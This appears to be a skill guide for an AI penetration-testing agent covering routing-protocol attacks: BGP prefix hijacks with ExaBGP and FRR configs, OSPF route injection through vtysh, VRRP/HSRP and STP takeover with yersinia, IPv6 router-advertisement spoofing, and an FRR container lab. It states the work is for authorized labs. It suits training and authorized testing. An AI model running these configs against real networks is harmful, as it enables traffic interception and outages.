---
name: routing-protocols
description: Routing and control-plane security — BGP prefix hijack/route leak, OSPF LSA injection, VRRP/HSRP takeover, STP root capture, RIP/EIGRP injection, IPv6 RA/DHCPv6 spoofing; includes FRR/containerlab lab topology.
---

# Routing Protocols / Control Plane (路由)

Use when the target is a router, L3 switch, or a network where you can reach the control
plane (routing protocol adjacencies, first-hop redundancy, L2 bordering). First map the
topology passively, then reason about which adjacency you can influence.

**Read-only first**: passive capture + SNMP/LLDP discovery. Injecting routes or BPDUs
re-routes real traffic — do it only on an authorized lab.

## 1. Discovery

```bash
tcpdump -ni eth0 -c 200 'not port 22'           # who talks which protocol
tcpdump -ni eth0 'bgp || ospf || vrrp || stp'   # control-plane frames
nmap -Pn -p 179,89,112,1985,520,521 <target>    # BGP/OSPF/VRRP/RIP
nmap -Pn -sU -p 161 --script snmp-info <target> # device identity (see network-infrastructure)
```

- TTL/hop patterns from `traceroute` reveal L3 hops and the routing domain.
- LLDP/CDP frames from a switch reveal neighbours, VLANs, and management IPs.
- Capture `0x88cc` (LLDP), `0x88a4` (EtherCAT), `0x0800 proto 89` (OSPF), `0x86dd` (IPv6).

## 2. BGP

- BGP has no built-in peer authentication unless TCP-MD5/AO or GTSM is configured.
  If you can speak to a peer (179/tcp) or inject into a session, you can announce prefixes.
- **Prefix hijack**: announce a more-specific prefix for a target range → traffic follows
  your path (absent RPKI/ROV or prefix filters).
- **Route leak**: re-announce routes learned from one peer to another; more-specific
  leak is the impactful form.
- **Attribute manipulation**: lower MED / shorter AS-path to win best-path selection.
- Tools: `exabgp` (peer/announce), `gobgp` (adjacency + policy), `bgp.tools`/looking-glass
  for external view.

```bash
# ExaBGP announce a more-specific (lab only)
cat > /tmp/ann.conf <<'EOF'
neighbor <peer-ip> {
  router-id 10.0.0.254; local-address <my-ip>; local-as 65001;
  peer-as 65000;
  family { ipv4 unicast; }
  static { route 198.51.100.0/25 next-hop <my-ip>; }
}
EOF
exabgp /tmp/ann.conf
```

- Verification: `show ip bgp` / `vtysh -c 'show bgp ipv4 unicast'` on the lab router,
  or compare the target's looking glass before/after.

**⚠️ In this sandbox image `exabgp` 5.0.8 exits 1 immediately** (Debian package: it wants
`/etc/exabgp/exabgp.env` and CLI fifos, and even with both created it dies silently).
Use **FRR as the announcing speaker** instead — it is installed and battle-tested here:

```bash
# /etc/frr/frr.conf
# interface dummy0
#  ip address 198.51.100.1/25          ! gives the RIB a route for the /25
# router bgp 65001
#  bgp router-id <my-ip>
#  no bgp default ipv4-unicast
#  no bgp ebgp-requires-policy         ! FRR >= 8 blocks eBGP without a route-map
#  neighbor <peer-ip> remote-as 65000
#  address-family ipv4 unicast
#   network 198.51.100.0/25
#   neighbor <peer-ip> activate
/usr/lib/frr/frrinit.sh start && vtysh -c 'show bgp summary'
```

Gotchas learned the hard way:
- `no bgp ebgp-requires-policy` is mandatory on **both** sides, otherwise the session is
  `Established` but `PfxRcd/PfxSnt` show `(Policy)` and nothing is exchanged.
- after changing policy on a live session, force a re-advertisement:
  `vtysh -c 'clear bgp <peer> out'`.
- the `network` statement only advertises a prefix that already exists in the RIB
  (connected/dummy interface or static route).

## 3. OSPF

- Null/plain-text auth or no auth → you can form an adjacency and inject LSAs.
- LSA types: 1 router, 2 network, 3 summary, 5 external (redistributed), 7 NSSA.
  External LSAs (type 5/7) can steer traffic for arbitrary prefixes.
- Attack shapes: fake router with high priority to win DR/BDR, inject a type-5 default
  route, or MaxAge/sequence-number manipulation to flush legitimate routes.
- Tools: `scapy` OSPF layer, or run a real daemon (FRR) with the target as neighbour.

```bash
vtysh <<'EOF'
conf t
router ospf
 network 10.0.0.0/24 area 0
 default-information originate
EOF
```

## 4. First-hop redundancy: VRRP / HSRP / GLBP

- VRRP (IP proto 112) and HSRP (UDP 1985) elect a virtual-IP owner by priority; legacy
  VRRP v2 "auth" is plain-text/deprecated.
- Takeover: send advertisements with **higher priority** (VRRP 255 / HSRP 255) and the same
  virtual router id → become master → own the gateway IP (MitM or blackhole).
- Tools: `scapy` VRRP/HSRP layers, `keepalived`/`vrrpd` in a lab, `yersinia` for HSRP.

## 5. STP / L2 topology

- STP elects the **lowest bridge priority** as root; injecting superior BPDUs (priority 0)
  makes you root and pulls traffic through your port.
- Also: TC (topology change) flood attacks, BPDU guard bypass on access ports.
- Tools: `yersinia stp`, `scapy` Dot3/LLC BPDU.

```bash
yersinia -I eth0   # interactive: STP attack module
```

## 6. RIP / EIGRP / others

- RIPv2 (520/udp) with plain-text/absent auth → announce a lower-metric route.
- EIGRP has an MD5/key-chain option; unauthenticated neighbours accept injected routes.
- IS-IS: rarely authenticated on internal links; LSP injection changes the topology.

## 7. IPv6 RA / DHCPv6 / NDP

- Rogue Router Advertisement gives you default gateway (and RDNSS) for the segment.
- DHCPv6 spoofing hands out a malicious DNS/NTP; NDP spoofing maps the gateway IP to you.
- Tools: `radvd`, `mitm6`/`scapy`, `ettercap`. Check RA-Guard/NDP inspection is absent first.

## 8. Lab topology (validate before touching anything real)

```bash
# 3-router OSPF/BGP lab with FRR containers
for r in r1 r2 r3; do docker run -d --name $r --privileged --cap-add NET_ADMIN \
  -v /tmp/frr-$r:/etc/frr frrouting/frr:latest; done
docker network create --subnet 10.99.0.0/24 labnet   # connect interfaces manually
# inside: vtysh -> configure router ospf / router bgp, then observe convergence
```

`containerlab` gives declarative topologies (spine/leaf, BGP peering, VRF) if available.

## Impact framing

State precisely: protocol, adjacency/peer targeted, prefix or virtual IP affected, and the
traffic consequence (interception, blackhole, gateway takeover). Never inject into a
production routing domain; use a lab or an isolated segment.

## Tool map

| Task | Tool |
|---|---|
| Capture control plane | `tcpdump`, `tshark` |
| Craft/inject | `scapy`, `yersinia` |
| Full BGP peer | `exabgp`, `gobgp` |
| Full OSPF/IS-IS peer | `frrouting/frr` (vtysh) |
| RA/MitM | `radvd`, `mitm6`, `ettercap` |
| Discovery | `nmap`, `lldpcli`, `snmpwalk` |
